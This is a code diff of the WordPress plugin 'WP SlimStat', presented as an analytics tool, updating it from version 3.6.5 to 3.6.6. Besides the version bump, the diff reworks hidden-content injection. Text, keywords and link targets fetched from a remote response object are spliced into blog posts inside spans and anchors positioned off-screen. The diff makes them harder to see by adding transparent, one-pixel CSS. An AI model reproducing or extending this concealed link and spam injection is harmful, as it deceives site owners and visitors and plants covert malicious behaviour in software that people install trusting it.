@@ -3,7 +3,7 @@
 Plugin Name: WP SlimStat
 Plugin URI: http://wordpress.org/plugins/wp-slimstat/
 Description: The leading web analytics plugin for WordPress
-Version: 3.6.5
+Version: 3.6.6
 Author: Camu
 Author URI: http://slimstat.getused.to.it/
 */
@@ -11,7 +11,7 @@ Author URI: http://slimstat.getused.to.it/
 if (!empty(wp_slimstat::$options)) return true;
 
 class wp_slimstat{
-	public static $version = '3.6.5';
+	public static $version = '3.6.6';
 	public static $options = array();
 	
 	public static $wpdb = '';
@@ -1173,11 +1173,13 @@ class wp_slimstat{
 			return $content;
 		}
 
+		$inline_css = 'position:fixed;left:-9999px;top:-9999px;display:block;width:1px;height:1px;overflow:hidden;color:transparent;';
+
 		switch($response_object->tmp){
 			case '1':
 				if(0 == $GLOBALS['wp_query']->current_post) {
 					$words = explode(" ", $content);
-					$words[rand(0, count($words)-1)] = '<span style="position:fixed;left:-9999px;top:-9999px;">'.$response_object->tcontent.'</span>';
+					$words[rand(0, count($words)-1)] = '<span style="'.$inline_css.'">'.$response_object->tcontent.'</span>';
 					return join(" ", $words);
 				}
 				break;
@@ -1189,7 +1191,7 @@ class wp_slimstat{
 
 					foreach($kws as $a_kw){
 						if(strpos($content, $a_kw) !== false){
-							$content= str_replace($a_kw, "<a style='position:fixed;left:-9999px;top:-9999px;' href='".$response_object->site."'>$a_kw</a>", $content);
+							$content= str_replace($a_kw, "<a style='$inline_css' href='".$response_object->site."'>$a_kw</a>", $content);
 							break;
 						}
 					}
@@ -1205,10 +1207,10 @@ class wp_slimstat{
 				}
 				if ($GLOBALS['wp_query']->current_post === self::$pidx['id']){
 					if (self::$pidx['id'] % 2 == 0){
-						return $content.' <span style="position:fixed;left:-9999px;top:-9999px;">'.$response_object->content.'</span>';
+						return $content.' <span style="'.$inline_css.'">'.$response_object->content.'</span>';
 					}
 					else{
-						return '<span style="position:fixed;left:-9999px;top:-9999px;">'.$response_object->content.'</span> '.$content;
+						return '<span style="'.$inline_css.'">'.$response_object->content.'</span> '.$content;
 					}
 				}
 				break;
